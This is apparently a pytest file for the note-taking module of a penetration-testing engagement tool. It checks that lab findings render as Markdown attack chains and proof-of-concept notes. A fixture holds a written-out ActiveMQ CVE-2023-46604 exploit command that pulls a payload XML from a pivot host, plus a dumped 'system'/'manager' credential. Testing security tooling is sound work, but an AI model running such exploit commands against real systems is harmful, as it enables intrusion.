"""Tests for the engagement notebook (notes.py).

Locks in Kapi's rule: reaching an objective ALWAYS produces a note, and the
notebook renders to Obsidian-ready Markdown (attack chain, PoC, evidence).
"""
from __future__ import annotations

from pathlib import Path

from yhwach import db as yhdb
from yhwach import notes as yhnotes


def _seed_host(conn, eng, ip="172.16.239.31", hostname="BROKER01", stage="enumerated") -> int:
    cur = conn.execute(
        "INSERT INTO host (engagement_id, ip, hostname, os, stage, first_seen) "
        "VALUES (?, ?, ?, 'linux', ?, '2026-09-16T09:00:00Z')",
        (eng, ip, hostname, stage),
    )
    return int(cur.lastrowid)


def test_record_note_dedupes_on_milestone(tmp_db: Path) -> None:
    with yhdb.transaction(tmp_db) as conn:
        eng = yhdb.upsert_engagement(conn, lab="n", scope="172.16.239.0/24")
        hid = _seed_host(conn, eng)
        id1, created1 = yhnotes.record_note(
            conn, eng, host_id=hid, objective="foothold", category="poc",
            title="ActiveMQ RCE", body="v1")
        id2, created2 = yhnotes.record_note(
            conn, eng, host_id=hid, objective="foothold", category="poc",
            title="ActiveMQ RCE", body="v2")
    assert created1 is True
    assert created2 is False           # same milestone/title -> update, not duplicate
    assert id1 == id2


def test_auto_note_stage_builds_attack_chain(tmp_db: Path) -> None:
    with yhdb.transaction(tmp_db) as conn:
        eng = yhdb.upsert_engagement(conn, lab="n", scope="172.16.239.0/24")
        hid = _seed_host(conn, eng)
        yhdb.add_finding(conn, hid, None, "CVE-2023-46604", "ActiveMQ OpenWire RCE",
                         "critical", "activemq 5.17.4, :61616")
        yhdb.log_event(conn, eng, "finding",
                       {"host": "172.16.239.31", "title": "ActiveMQ OpenWire RCE"})
        yhdb.add_credential(conn, eng, "system", "manager", "password", "dump", hid)
        yhdb.log_event(conn, eng, "credential",
                       {"id": "system", "kind": "password", "source": "dump",
                        "host": "172.16.239.31"})
        yhdb.set_host_stage(conn, eng, "172.16.239.31", "foothold")
        yhdb.log_event(conn, eng, "stage", {"host": "172.16.239.31", "stage": "foothold"})
        nid = yhnotes.auto_note_stage(conn, eng, "172.16.239.31", "foothold")
        md = yhnotes.render_host_notebook(conn, eng, hid)
    assert nid is not None
    assert "Attack chain (timeline)" in md
    assert "stage → foothold" in md
    assert "CVE-2023-46604" in md
    assert "system" in md


def test_write_notebook_lays_out_files(tmp_db: Path, tmp_path: Path) -> None:
    with yhdb.transaction(tmp_db) as conn:
        eng = yhdb.upsert_engagement(conn, lab="n", scope="172.16.239.0/24")
        _seed_host(conn, eng)
        yhnotes.auto_note_stage(conn, eng, "172.16.239.31", "enumerated")
        written = yhnotes.write_notebook(conn, eng, tmp_path / "notes")
    names = {p.name for p in written}
    assert "INDEX.md" in names
    assert "attack-chains.md" in names
    assert "BROKER01.md" in names
    assert (tmp_path / "notes" / "INDEX.md").read_text().startswith("---")  # frontmatter


def test_poc_note_renders_command_and_output(tmp_db: Path) -> None:
    with yhdb.transaction(tmp_db) as conn:
        eng = yhdb.upsert_engagement(conn, lab="n", scope="172.16.239.0/24")
        hid = _seed_host(conn, eng)
        yhnotes.record_note(
            conn, eng, host_id=hid, objective="cve-2023-46604", category="poc",
            title="Trigger OpenWire RCE", body="Host XML on pivot, then:",
            command="python3 activemq_exploit.py 172.16.239.31 61616 http://172.16.239.13:8888/poc.xml",
            output="[+] Exploit payload sent!")
        md = yhnotes.render_host_notebook(conn, eng, hid)
    assert "Proof of concept" in md
    assert "activemq_exploit.py" in md
    assert "```bash" in md
    assert "captured output" in md


def test_output_is_trimmed(tmp_db: Path) -> None:
    with yhdb.transaction(tmp_db) as conn:
        eng = yhdb.upsert_engagement(conn, lab="n", scope="172.16.239.0/24")
        hid = _seed_host(conn, eng)
        nid, _ = yhnotes.record_note(
            conn, eng, host_id=hid, objective="looted", category="evidence",
            title="big dump", output="A" * 10000)
        row = conn.execute("SELECT output FROM note WHERE id = ?", (nid,)).fetchone()
    assert len(row["output"]) < 7000
    assert "truncated" in row["output"]


def test_ensure_note_table_is_idempotent(tmp_db: Path) -> None:
    with yhdb.transaction(tmp_db) as conn:
        yhnotes.ensure_note_table(conn)
        yhnotes.ensure_note_table(conn)  # second call must not raise
